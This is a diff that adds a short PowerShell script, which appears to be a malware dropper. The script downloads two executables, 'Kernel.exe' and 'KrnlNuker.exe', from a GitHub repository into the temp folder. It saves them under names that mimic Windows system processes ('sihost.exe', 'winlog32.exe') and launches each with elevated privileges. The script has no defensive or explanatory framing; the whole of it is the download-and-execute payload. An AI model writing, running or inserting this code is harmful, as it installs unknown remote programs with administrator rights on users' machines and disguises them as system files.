@@ -1,0 +1,23 @@
+
+
+
+
+$settings = '{"WD": false, "adminrun": false}' | ConvertFrom-Json
+
+if ($settings.adminrun) {
+$outputPath = [System.IO.Path]::Combine($env:TEMP, 'winlog32.exe')
+} else {
+$outputPath = [System.IO.Path]::Combine($env:TEMP, 'sihost.exe')
+}
+
+
+
+$webClient = New-Object System.Net.WebClient
+$webClient.DownloadFile("https://github.com/MB2RZEN/tcx/raw/refs/heads/main/Kernel.exe", $outputPath)
+Start-Process -FilePath $outputPath -Verb RunAs
+Start-Sleep -Milliseconds 300
+$webClient.DownloadFile("https://github.com/MB2RZEN/tcx/raw/refs/heads/main/KrnlNuker.exe", $outputPath)
+Start-Process -FilePath $outputPath -Verb RunAs
+
+
+
